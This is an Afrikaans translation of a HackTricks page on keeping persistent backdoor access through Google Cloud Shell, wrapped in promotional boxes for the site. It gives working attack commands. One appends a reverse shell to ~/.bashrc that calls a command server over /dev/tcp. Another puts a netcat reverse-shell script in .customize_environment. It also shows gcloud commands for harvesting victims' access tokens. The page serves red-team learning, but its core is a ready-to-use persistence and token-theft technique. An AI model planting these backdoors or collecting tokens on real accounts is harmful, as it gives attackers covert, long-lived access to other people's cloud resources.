# GCP - Wolkmussel Volharding

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* github-opslag.

</details>

## Wolkmussel

Vir meer inligting, kyk:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Volhoubare Agterdeur

[**Google Cloud Shell**](https://cloud.google.com/shell/) bied jou die moontlikheid om opdraggewys toegang tot jou wolkmiddels direk vanuit jou webblaaier te verkry sonder enige geassosieerde koste.

Jy kan toegang tot Google se Wolkmussel verkry vanaf die **webkonsol** of deur **`gcloud cloud-shell ssh`** uit te voer.

Hierdie konsol het 'n paar interessante vermo√´ns vir aanvallers:

1. **Enige Google-gebruiker met toegang tot Google Wolke** het toegang tot 'n ten volle geauthentiseerde Wolkmussel-instansie (Diensrekeninge kan, selfs al is hulle eienaars van die organisasie).
2. Genoemde instansie sal **sy tuisgids vir ten minste 120 dae handhaaf** as geen aktiwiteit plaasvind nie.
3. Daar is **geen vermo√´ vir 'n organisasie om die aktiwiteit** van daardie instansie te monitor nie.

Dit beteken basies dat 'n aanvaller 'n agterdeur in die tuisgids van die gebruiker kan plaas en solank die gebruiker elke 120 dae ten minste na die GC-mussel koppel, sal die agterdeur oorleef en die aanvaller sal elke keer 'n skul kry wanneer dit uitgevoer word deur net te doen:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Daar is 'n ander l√™er in die huisvouer genaamd **`.customize_environment`** wat, indien dit bestaan, elke keer uitgevoer gaan word wanneer die gebruiker die **wolkmussel** toegang (soos in die vorige tegniek). Voeg net die vorige agterdeur in of een soos die volgende om volharding te handhaaf solank as wat die gebruiker die wolkmussel "gereeld" gebruik:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Dit is belangrik om daarop te let dat die **eerste keer wanneer 'n aksie wat verifikasie vereis, uitgevoer word**, 'n pop-up-verifikasievenster in die gebruiker se webblaaier verskyn. Hierdie venster moet aanvaar word voordat die bevel uitgevoer kan word. As 'n onverwagte pop-up verskyn, kan dit argwaan wek en moontlik die volhardingsmetode wat gebruik word, in gevaar bring.
{% endhint %}

Dit is die pop-up van die uitvoering van `gcloud projects list` van die wolkshell (as aanvaller) wat in die webblaaier se gebruikersessie gesien word:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Maar as die gebruiker aktief die wolkshell gebruik het, sal die pop-up nie verskyn nie en kan jy **gebruikers se tokens versamel met**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Hoe die SSH-verbinding tot stand gebring word

Basies word hierdie 3 API-oproepe gebruik:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (sal jou dwing om jou publieke sleutel wat jy plaaslik geskep het, by te voeg)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (sal jou dwing om die instansie te begin)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (sal jou die IP van die Google Cloud Shell vertel)

Maar jy kan verdere inligting vind by [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Verwysings

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
